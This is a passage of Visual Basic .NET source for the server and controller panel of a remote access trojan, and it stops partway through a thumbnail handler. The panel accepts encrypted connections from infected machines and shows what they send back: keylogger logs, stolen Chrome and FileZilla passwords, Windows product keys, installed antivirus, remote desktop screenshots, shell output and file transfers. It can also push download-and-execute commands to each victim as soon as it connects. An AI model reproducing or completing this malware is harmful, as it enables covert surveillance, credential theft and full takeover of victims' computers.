Imports System.Net.Sockets
Imports System.Net
Imports System.Text
Imports System.Threading
Imports System.Text.Encoding
Imports System.Net.NetworkInformation
Imports System.IO
Imports System.CodeDom.Compiler

Public Class Form1

    Public port As Integer = 0
    Dim listener As TcpListener
    Public listeningThread As Thread
    Public enable As Boolean = True
    Public listening As Boolean = False
    Public enckey As String = "xilAeTlwiiVXyBD0qxHJHpW8d8tbPqTw"
    Dim frames As Long = 0
    Dim number As Integer = 1
    Dim Groups(4) As ListViewGroup
    Dim alreadygroup As Boolean = False
    Public path, oldpath, nam As String
    Public filename As String
    Dim icnpath As String
    Dim curntuser As String
    Dim compileserver As Thread
    Delegate Sub DelegateAdd(ByVal client As Connection, ByVal msg As String)
    Delegate Sub DelegateToggleListen(ByVal toggle As Boolean)
    Delegate Sub DelegateChangeText(ByVal text As String, ByVal color As System.Drawing.Color)
    Delegate Sub DelegateRemove(ByVal client As Connection)
    Delegate Sub DelegateAddSystemInformation(ByVal text As String)
    Delegate Sub DelegateAddProcess(ByVal txt As String)
    Delegate Sub DelegateAddSoftware(ByVal txt As String)
    Delegate Sub DelegateShowImage(ByVal txt As String)
    Delegate Sub DelegateListDevices(ByVal txt As String)
    Delegate Sub DelegateAddBounds(ByVal txt As String)
    Delegate Sub DelegateHostsFile(ByVal txt As String)
    Delegate Sub DelegateCPImage(ByVal txt As String)
    Delegate Sub DelegateCPText(ByVal txt As String)
    Delegate Sub DelegateShell(ByVal txt As String)
    Delegate Sub DelegateAddLogs(ByVal txt As String)
    Delegate Sub DelegatePlayandSaveAudio(ByVal txt As String)
    Delegate Sub DelegateAddPasswords(ByVal txt As String)
    Delegate Sub DelegateAddTCP(ByVal txt As String)
    Delegate Sub DelegateAddStartupEntries(ByVal txt As String)
    Delegate Sub DelegateAddDrives(ByVal txt As String)
    Delegate Sub DelegateAddFiles(ByVal txt As String)
    Delegate Sub DelegateAddWebcamDevices(ByVal txt As String)
    Delegate Sub DelegateAddThumbnail(ByVal txt As String, ByVal client As Connection)
    Delegate Sub DelegateAddWebcam(ByVal txt As String)
    Delegate Sub DelegateAddServices(ByVal txt As String)

    Sub New()
        InitializeComponent()
    End Sub
    Private Sub ChangeFont(ByVal container As Control)
        For Each ctrl As Control In container.Controls
            ' Change font for the control
            ctrl.Font = New Font("Segoe Print", 9, FontStyle.Bold)

            ' If the control has children, recursively change their fonts
            If ctrl.HasChildren Then
                ChangeFont(ctrl)
            End If
        Next
    End Sub
#Region "Connection"
    Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
        Try
            'DarkModeHelper.ApplyDarkMode(Me)
            ChangeFont(Me)
            ' Load settings
            cb_autolistening.Checked = My.Settings.autolistening
            cb_ShowNotification.Checked = My.Settings.ShowNotification
            cb_PlaySound.Checked = My.Settings.PlaySound

            ' Set the port
            port = If(My.Settings.port <> 0, My.Settings.port, 4444)
            NumericUpDown1.Value = port

            ' Update UI based on listening status
            If My.Settings.port <> 0 AndAlso My.Settings.autolistening Then
                StartListening()
            Else
                UpdateUIForPortClosed()
            End If

        Catch ex As Exception
            ' Handle any potential exceptions
            MsgBox("Error loading form: " & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub btn_startlistening_Click(ByVal sender As Object, ByVal e As EventArgs)
        Try
            If listeningThread IsNot Nothing AndAlso listeningThread.IsAlive Then
                MsgBox("You are already listening on this port!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            StartListening()

        Catch ex As Exception
            MsgBox("Error starting listening thread: " & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub StartListening()
        listeningThread = New Thread(AddressOf Listen)
        listeningThread.IsBackground = True
        listeningThread.Start()
        Invoke(New DelegateChangeText(AddressOf ChangeText), "Status: Listening...", Color.Green)
        ToolStripLabel1.Text = "Listen port"
        ToolStripButton1.Image = ImageList1.Images.Item(0)
    End Sub

    Private Sub UpdateUIForPortClosed()
        ToolStripLabel1.Text = "Port Closed"
        ToolStripButton1.Image = ImageList1.Images.Item(1)
        Label2.Text = "Status: Idle..."
    End Sub

    Sub Listen()
        Try
            listener = New TcpListener(IPAddress.Any, port)
            listener.Start()
            While True
                Dim client As New Connection(listener.AcceptTcpClient())
                AddHandler client.GotInfo, AddressOf GotInfo
                AddHandler client.Disconnected, AddressOf Disconnected
            End While
        Catch ex As Exception
            Invoke(New Action(Of Boolean)(AddressOf ToggleListen), False)
        End Try
    End Sub

    Sub ToggleListen(ByVal toggle As Boolean)
        listening = toggle
        enable = Not toggle
    End Sub

    Sub Add(ByVal client As Connection, ByVal msg As String)

        Dim ip = client.IPAddress
        Dim reply = New Ping().Send(ip, 3000)
        Dim msgParts = msg.Split("|"c)

        ' Check for existing items in the ListView
        For Each item As ListViewItem In ListView1.Items
            If item.Text = msgParts(1) AndAlso
               item.SubItems(1).Text = ip AndAlso
               item.SubItems(2).Text = port.ToString() AndAlso
               item.SubItems(3).Text = msgParts(2) AndAlso
               item.SubItems(4).Text = msgParts(3) AndAlso
               item.SubItems(5).Text = msgParts(4) AndAlso
               item.SubItems(6).Text = msgParts(5) AndAlso
               item.SubItems(7).Text = msgParts(6) Then
                Exit Sub
            End If
        Next

        ' Add new item to ListView
        Dim l As New ListViewItem(msgParts(1), 3) With {
            .Tag = client,
            .ToolTipText = String.Format("IP: {0}{1}Username: {2}{1}Computer Name: {3}{1}Operating System: {4}{1}Version: {4}{1}Privileges: {5}", client.IPAddress, vbCrLf, msgParts(2), msgParts(3), msgParts(4), msgParts(6))
        }

        With l
            .SubItems.Add(msgParts(6)) ' type
            .SubItems.Add(client.IPAddress) ' IP
            .SubItems.Add(msgParts(2)) ' username
            .SubItems.Add(msgParts(3)) ' PC
            .SubItems.Add(msgParts(4)) 'OS
            .SubItems.Add(msgParts(5)) 'OSv
            .SubItems.Add(msgParts(6)) 'prev
            .SubItems.Add(reply.RoundtripTime & "/ms") ' ping
        End With

        ListView1.Items.Add(l)
        checkonconnect(client)

        ' Show notification if enabled
        If My.Settings.ShowNotification Then
            If My.Settings.PlaySound Then
                My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
            End If
            Notify.BalloonTipIcon = ToolTipIcon.Info
            Notify.BalloonTipText = l.ToolTipText
            Notify.BalloonTipTitle = "New Connection!"
            Notify.Visible = True
            Notify.ShowBalloonTip(600)
        End If
    End Sub

    Sub GotInfo(ByVal client As Connection, ByVal msg As String)
        msg = New Encryption().AES_Decrypt(msg, enckey)

        If msg.StartsWith("NewConnection") Then
            Invoke(New DelegateAdd(AddressOf Add), client, msg)
        ElseIf msg.StartsWith("SystemInformation") Then
            Invoke(New DelegateAddSystemInformation(AddressOf AddSystemInformation), msg)
        ElseIf msg.StartsWith("GetProcess") Then
            Invoke(New DelegateAddProcess(AddressOf AddProcess), msg)
        ElseIf msg.StartsWith("Software") Then
            Invoke(New DelegateAddSoftware(AddressOf AddSoftware), msg)
        ElseIf msg.StartsWith("RemoteDesktop") Then
            Invoke(New DelegateShowImage(AddressOf ShowImage), msg.Replace("RemoteDesktop", ""))
        ElseIf msg.StartsWith("PCBounds") Then
            Invoke(New DelegateAddBounds(AddressOf AddBounds), msg)
        ElseIf msg.StartsWith("Shell") Then
            Invoke(New DelegateShell(AddressOf Shell), msg.Replace("Shell", ""))
        ElseIf msg.StartsWith("YATURU") Then
            Invoke(New DelegateAddLogs(AddressOf AddLogs), msg.Replace("YATURU", ""))
        ElseIf msg.StartsWith("Passwords") Then
            Invoke(New DelegateAddPasswords(AddressOf AddPasswords), msg.Replace("Passwords", ""))
        ElseIf msg.StartsWith("TCPConnections") Then
            Invoke(New DelegateAddTCP(AddressOf AddTCP), msg)
        ElseIf msg.StartsWith("Strtp") Then
            Invoke(New DelegateAddStartupEntries(AddressOf AddStartupEntries), msg.Replace("Strtp", ""))
        ElseIf msg.StartsWith("Drives") Then
            Invoke(New DelegateAddDrives(AddressOf AddDrives), msg.Replace("Drives", ""))
        ElseIf msg.StartsWith("FileManagerFiles") Then
            Invoke(New DelegateAddFiles(AddressOf AddFiles), msg.Replace("FileManagerFiles", ""))
        ElseIf msg.StartsWith("IncomingFile") Then
            Dim downloadPath As String = Application.StartupPath & "\DownloadedFiles"
            Dim userPath As String = downloadPath & "\" & curntuser
            Dim filePath As String = userPath & "\" & filename

            If Not Directory.Exists(downloadPath) Then
                Directory.CreateDirectory(downloadPath)
            End If
            If Not Directory.Exists(userPath) Then
                Directory.CreateDirectory(userPath)
            End If

            IO.File.WriteAllBytes(filePath, New Encryption().DecryptBase64(msg.Replace("IncomingFile", "")))
        ElseIf msg.StartsWith("ThumbNail") Then
            Invoke(New DelegateAddThumbnail(AddressOf AddThumbnail), msg.Replace("ThumbNail", ""), client)
        End If
    End Sub

    Sub Disconnected(ByVal client As Connection)
        Invoke(New DelegateRemove(AddressOf Remove), client)
    End Sub
    Sub Remove(ByVal client As Connection)
        For Each item As ListViewItem In ListView1.Items
            If item.SubItems(2).Text = client.IPAddress Then
                item.Remove()
                If My.Settings.ShowNotification = True Then
                    If My.Settings.PlaySound = True Then
                        My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
                    End If
                    Notify.BalloonTipIcon = ToolTipIcon.Error
                    Notify.BalloonTipText = "IP: " & item.SubItems(2).Text
                    Notify.BalloonTipTitle = "Disconnected!"
                    Notify.Visible = True
                    Notify.ShowBalloonTip(600)
                End If
                Exit For
            End If
        Next
    End Sub
    Sub SendToSelected(ByVal Message As String)
        For Each item As ListViewItem In ListView1.SelectedItems
            Try
                Dim c As Connection = DirectCast(item.Tag, Connection)
                c.Send(Message)
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        Next
    End Sub
    Sub SendToAll(ByVal Message As String)
        For Each item As ListViewItem In ListView1.Items
            Try
                Dim c As Connection = DirectCast(item.Tag, Connection)
                c.Send(Message)
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        Next
    End Sub
    Sub ChangeText(ByVal text As String, ByVal color As System.Drawing.Color)
        Label2.Text = text
        Label2.ForeColor = color
    End Sub
    Private Sub btn_stoplistening_Click(ByVal sender As Object, ByVal e As EventArgs)
        If listeningThread.IsAlive = True Then
            SendToAll(New Encryption().AES_Encrypt("Disconnected", enckey))
            listener.Server.Close()
            listeningThread.Abort()
            Invoke(New DelegateToggleListen(AddressOf ToggleListen), False)
            Invoke(New DelegateChangeText(AddressOf ChangeText), "Status: Idle...", Color.Black)
            ListView1.Items.Clear()
        End If
    End Sub
    Private Sub NumericUpDown1_ValueChanged(ByVal sender As Object, ByVal e As EventArgs)
        port = NumericUpDown1.Value
        My.Settings.port = NumericUpDown1.Value
        My.Settings.Save()
    End Sub
    Sub checkonconnect(ByVal client As Connection)
        For Each item As ListViewItem In ListViewOnConnect.Items
            If item.Text = "Open Website" And item.SubItems(2).Text = "Enabled" Then
                client.Send(New Encryption().AES_Encrypt("OpenWebsite" & item.SubItems(1).Text, enckey))
            ElseIf item.Text = "Download & Execute" And item.SubItems(2).Text = "Enabled" Then
                client.Send(New Encryption().AES_Encrypt("DandE" & item.SubItems(1).Text, enckey))
            ElseIf item.Text = "Show MessageBox" And item.SubItems(2).Text = "Enabled" Then
                client.Send(New Encryption().AES_Encrypt("MSG" & item.SubItems(1).Text, enckey))
            End If
        Next
    End Sub
#Region "Settings"
    Private Sub cb_autolistening_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
        If cb_autolistening.Checked Then
            My.Settings.autolistening = True
        Else
            My.Settings.autolistening = False
        End If
    End Sub
    Private Sub cb_ShowNotification_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
        If cb_ShowNotification.Checked Then
            My.Settings.ShowNotification = True
        Else
            My.Settings.ShowNotification = False
        End If
    End Sub
    Private Sub cb_PlaySound_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
        If cb_PlaySound.Checked Then
            My.Settings.PlaySound = True
        Else
            My.Settings.PlaySound = False
        End If
    End Sub
#End Region
#End Region

#Region "Others"

#Region "Group By"
    Public Sub GroupListView(ByVal lstV As ListView, ByVal SubItemIndex As Int16)
        Try
            Dim flag As Boolean = True
            For Each l As ListViewItem In lstV.Items
                Dim strmyGroupname As String = l.SubItems(SubItemIndex).Text
                For Each lvg As ListViewGroup In lstV.Groups
                    If lvg.Name = strmyGroupname Then
                        l.Group = lvg
                        flag = False
                    End If
                Next
                If flag = True Then
                    Dim lstGrp As New ListViewGroup(strmyGroupname, strmyGroupname)
                    lstV.Groups.Add(lstGrp)
                    l.Group = lstGrp
                End If
                flag = True
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub
    Private Sub CountryToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CountryToolStripMenuItem.Click
        GroupListView(ListView1, 0)
    End Sub

    Private Sub PrivilegsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PrivilegsToolStripMenuItem.Click
        GroupListView(ListView1, 1)
    End Sub
#End Region

    Public Function CountCharacter(ByVal value As String, ByVal ch As Char) As Integer
        Dim cnt As Integer = 0
        For Each c As Char In value
            If c = ch Then cnt += 1
        Next
        Return cnt
    End Function

    Sub AddSysteminformation(ByVal text As String)

        ' MsgBox(text)
        Try
            FormInfo.TreeView1.Nodes(1).Nodes(0).Text = "Registered Owner: " & text.Split("|")(1)
            FormInfo.TreeView1.Nodes(1).Nodes(1).Text = "Registered Organization: " & text.Split("|")(2)
            FormInfo.TreeView1.Nodes(1).Nodes(2).Text = "Product Key: " & text.Split("|")(3)
            FormInfo.TreeView1.Nodes(1).Nodes(3).Text = "MAC Adress: " & text.Split("|")(4)
            FormInfo.TreeView1.Nodes(1).Nodes(4).Text = "Webcam Available: " & text.Split("|")(5)
            FormInfo.TreeView1.Nodes(1).Nodes(5).Text = "Installed AntiVirus : " & text.Split("|")(6)
            FormInfo.TreeView1.Nodes(1).Nodes(6).Text = "Server Location: " & text.Split("|")(7)


            FormInfo.TreeView1.ExpandAll()
        Catch ex As Exception
            MsgBox(ex.Message)

        End Try


    End Sub

    Sub AddProcess(ByVal txt As String)
        Try
            Dim lines() As String = txt.Replace("GetProcess", "").Split(Environment.NewLine)
            Dim items As New List(Of ListViewItem)

            For Each line As String In lines
                Dim text() As String = line.Split("|")

                If text.Length >= 5 Then
                    Dim itemName As String = text(0)
                    Dim subItems As New List(Of String)

                    For i As Integer = 1 To 4
                        subItems.Add(text(i))
                    Next

                    Dim item As New ListViewItem(itemName)
                    item.SubItems.AddRange(subItems.ToArray())
                    items.Add(item)
                End If
            Next

            FormProcess.listprocess.Items.Clear()
            FormProcess.listprocess.Items.AddRange(items.ToArray())

            FormProcess.Label1.Text = "Total Processes: " & FormProcess.listprocess.Items.Count
        Catch ex As Exception
            ' Handle the exception if needed
        End Try
    End Sub

    Sub AddSoftware(ByVal txt As String)
        Try
            ' Clear the ListBox
            FormSoftwareList.ListBox_Software.Items.Clear()

            ' Split the input text by "|" separator
            Dim softwareList() As String = txt.Split("|"c)

            ' Check if there are at least two elements
            If softwareList.Length >= 2 Then
                ' Set the label text with the count of installed software
                FormSoftwareList.Label1.Text = "Installed Software: " & softwareList(0)

                ' Add software items to the ListBox starting from the second element
                For i As Integer = 1 To softwareList.Length - 1
                    FormSoftwareList.ListBox_Software.Items.Add(softwareList(i))
                Next
            End If
        Catch ex As Exception
            ' Handle the exception if needed
        End Try
    End Sub

    Sub ShowImage(ByVal txt As String)
        Dim b() As Byte = New Encryption().DecryptBase64(txt)
        RemoteDesktop.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
        RemoteDesktop.first = False
        RemoteDesktop.PictureBox1.Image = ByteArray2Image(b)
        frames += 1
        RemoteDesktop.FramesReceivedToolStripMenuItem.Text = "Frames Received: " & frames
        RemoteDesktop.remotecontrol = True
        RemoteDesktop.StartToolStripMenuItem.PerformClick()
    End Sub

    Public Function ByteArray2Image(ByVal ByAr() As Byte) As Image
        Dim img As Image
        Dim MS As New IO.MemoryStream(ByAr)
        Try
            img = Image.FromStream(MS)
        Catch ex As Exception
            Return Nothing
        End Try

        Return img
    End Function

    Sub AddBounds(ByVal txt As String)
        RemoteDesktop.pcheight = txt.Replace("PCBounds", "").Split("x")(0)
        RemoteDesktop.pcwidth = txt.Replace("PCBounds", "").Split("x")(1)
    End Sub

    Sub AddLogs(ByVal txt As String)
        Keylogger.RichTextBox1.Text = txt
    End Sub

    Sub AddPasswords(ByVal txt As String)
        Try
            ' Clear the ListView
            paswdrec.ListView1.Items.Clear()

            ' Split the input text by line separator
            Dim lines() As String = txt.Split(Environment.NewLine.ToCharArray(), StringSplitOptions.RemoveEmptyEntries)

            For Each line As String In lines
                Dim text() As String = line.Split("|"c)

                If text.Length >= 4 Then
                    Dim itemName As String = text(0)
                    Dim subItem1 As String = text(1)
                    Dim subItem2 As String = text(2)
                    Dim subItem3 As String = text(3)

                    Dim item As New ListViewItem(itemName)

                    If subItem1 = "Chrome" Then
                        item.ImageIndex = 0
                    ElseIf subItem1 = "FileZilla" Then
                        item.ImageIndex = 1
                    End If

                    item.SubItems.Add(subItem1)
                    item.SubItems.Add(subItem2)
                    item.SubItems.Add(subItem3)

                    paswdrec.ListView1.Items.Add(item)
                End If
            Next
        Catch ex As Exception
            ' Handle the exception if needed
        End Try
    End Sub

    Sub AddTCP(ByVal txt As String)
        Try
            ' Clear the ListView
            FormTCPconn.ListView_tcp.Items.Clear()

            ' Split the input text by line separator
            Dim lines() As String = txt.Replace("TCPConnections", "").Split(Environment.NewLine.ToCharArray(), StringSplitOptions.RemoveEmptyEntries)

            For Each line As String In lines
                Dim text() As String = line.Split("|"c)

                If text.Length >= 3 Then
                    Dim itemName As String = "TCP"
                    Dim subItem1 As String = text(0)
                    Dim subItem2 As String = text(1)
                    Dim subItem3 As String = text(2)

                    Dim item As New ListViewItem(itemName)

                    item.SubItems.Add(subItem1)
                    item.SubItems.Add(subItem2)
                    item.SubItems.Add(subItem3)

                    FormTCPconn.ListView_tcp.Items.Add(item)
                End If
            Next
        Catch ex As Exception
            ' Handle the exception if needed
        End Try
    End Sub

    Sub AddStartupEntries(ByVal txt As String)
        My.Computer.Clipboard.SetText(txt)
        FormStartup.ListView_Startup.Items.Clear()
        Groups(0) = New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", HorizontalAlignment.Left)
        Groups(1) = New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)
        Groups(2) = New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", HorizontalAlignment.Left)
        Groups(3) = New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)

        For i = 0 To 3
            FormStartup.ListView_Startup.Groups.Add(Groups(i))
        Next

        Dim x As New TextBox
        x.Text = txt
        For Each line As String In x.Lines
            Dim lw = New ListViewItem(line.Split("|")(1))
            lw.SubItems.Add(line.Split("|")(2))
            lw.Group = CheckGroup(line.Split("|")(0))
            FormStartup.ListView_Startup.Items.Add(lw)
        Next
    End Sub

    Function CheckGroup(ByVal txt As String)
        If txt = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" Then
            Return Groups(0)
        ElseIf txt = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" Then
            Return Groups(1)
        ElseIf txt = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" Then
            Return Groups(2)
        ElseIf txt = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" Then
            Return Groups(3)
        Else
            If alreadygroup = True Then
                Return Groups(4)
            Else
                Groups(4) = New ListViewGroup(txt, HorizontalAlignment.Left)
                FormStartup.ListView_Startup.Groups.Add(Groups(4))
                alreadygroup = True
                Return Groups(4)
            End If
        End If
    End Function

    Sub AddDrives(ByVal txt As String)
        Try

            For i = 0 To CountCharacter(txt, "|") - 1
                FormfileManager.ComboBox1.Items.Add(txt.Split("|")(i))
            Next

        Catch
        End Try
    End Sub

    Sub AddFiles(ByVal txt As String)
        Try
            path = txt.Split("|")(0)


            FormfileManager.TextBox1.Text = path.Remove(0, 3)

            txt = txt.Replace(txt.Split("|")(0) & "|", "")

            Dim ItemLines As New TextBox
            ItemLines.Text = txt

            For Each line As String In ItemLines.Lines
                Dim text() As String = line.Split("|")

                Dim ItemName As String = text(0)
                Dim SubItem1 As String = text(1)
                Dim SubItem2 As String = text(2)
                Dim SubItem3 As String = text(3)
                Dim SubItem4 As String = text(4)

                If SubItem4 = "1" Then
                    With FormfileManager.ListView_Files.Items.Add(ItemName, 0)
                        .SubItems.Add(SubItem1)
                        .SubItems.Add(SubItem2)
                        .SubItems.Add(SubItem3)
                        .SubItems.Add(SubItem4)
                    End With
                ElseIf SubItem4 = "0" Then
                    If ItemName.Contains(".exe") Or ItemName.Contains(".EXE") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 1)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".xls") Or ItemName.Contains(".XLS") Or ItemName.Contains(".xlt") Or ItemName.Contains(".XLT") Or ItemName.Contains(".XLTX") Or ItemName.Contains(".xltx") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 3)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".swf") Or ItemName.Contains(".SWF") Or ItemName.Contains(".flv") Or ItemName.Contains(".FLV") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 4)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".htm") Or ItemName.Contains(".HTM") Or ItemName.Contains(".html") Or ItemName.Contains(".HTML") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 5)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".ai") Or ItemName.Contains(".AI") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 6)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".aac") Or ItemName.Contains(".AAC") Or ItemName.Contains(".m4a") Or ItemName.Contains(".M4A") Or ItemName.Contains(".mp3") Or ItemName.Contains(".MP3") Or ItemName.Contains(".wav") Or ItemName.Contains(".WAV") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 7)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".pdf") Or ItemName.Contains(".PDF") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 8)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".psd") Or ItemName.Contains(".PSD") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 9)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".php") Or ItemName.Contains(".php3") Or ItemName.Contains(".phtml") Or ItemName.Contains(".PHP") Or ItemName.Contains(".PHTML") Or ItemName.Contains(".PHP3") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 10)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".ppt") Or ItemName.Contains(".PPT") Or ItemName.Contains(".PPTX") Or ItemName.Contains(".pptx") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 11)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".sln") Or ItemName.Contains(".SLN") Or ItemName.Contains(".user") Or ItemName.Contains(".USER") Or ItemName.Contains(".PDB") Or ItemName.Contains(".pdb") Or ItemName.Contains(".RESX") Or ItemName.Contains(".resx") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 12)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".doc") Or ItemName.Contains(".DOC") Or ItemName.Contains(".docx") Or ItemName.Contains(".DOCX") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 13)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".xaml") Or ItemName.Contains(".XAML") Or ItemName.Contains(".xml") Or ItemName.Contains(".XML") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 14)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".bfc") Or ItemName.Contains(".BFC") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 15)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".sql") Or ItemName.Contains(".SQL") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 16)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".pst") Or ItemName.Contains(".PST") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 18)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".3gpp") Or ItemName.Contains(".3GPP") Or ItemName.Contains(".avi") Or ItemName.Contains(".AVI") Or ItemName.Contains(".mp4") Or ItemName.Contains(".MP4") Or ItemName.Contains(".mov") Or ItemName.Contains(".MOV") Or ItemName.Contains(".mpeg") Or ItemName.Contains(".MPEG") Or ItemName.Contains(".WMA") Or ItemName.Contains(".wma") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 19)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".zip") Or ItemName.Contains(".ZIP") Or ItemName.Contains(".rar") Or ItemName.Contains(".RAR") Or ItemName.Contains(".tar.gz") Or ItemName.Contains(".TAR.GZ") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 20)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".jpeg") Or ItemName.Contains(".JPEG") Or ItemName.Contains(".jpg") Or ItemName.Contains(".JPG") Or ItemName.Contains(".gif") Or ItemName.Contains(".GIF") Or ItemName.Contains(".bmp") Or ItemName.Contains(".BMP") Or ItemName.Contains(".png") Or ItemName.Contains(".PNG") Or ItemName.Contains(".ico") Or ItemName.Contains(".ICO") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 21)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".rb") Or ItemName.Contains(".RB") Or ItemName.Contains(".py") Or ItemName.Contains(".PY") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 22)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".vb") Or ItemName.Contains(".VB") Or ItemName.Contains(".cs") Or ItemName.Contains(".CS") Or ItemName.Contains(".BAT") Or ItemName.Contains(".bat") Or ItemName.Contains(".CMD") Or ItemName.Contains(".cmd") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 2)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".txt") Or ItemName.Contains(".TXT") Then
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 24)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    Else
                        With FormfileManager.ListView_Files.Items.Add(ItemName, 17)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    End If
                End If
            Next

        Catch
        End Try
    End Sub

    Sub AddThumbnail(ByVal txt As String, ByVal client As Connection)
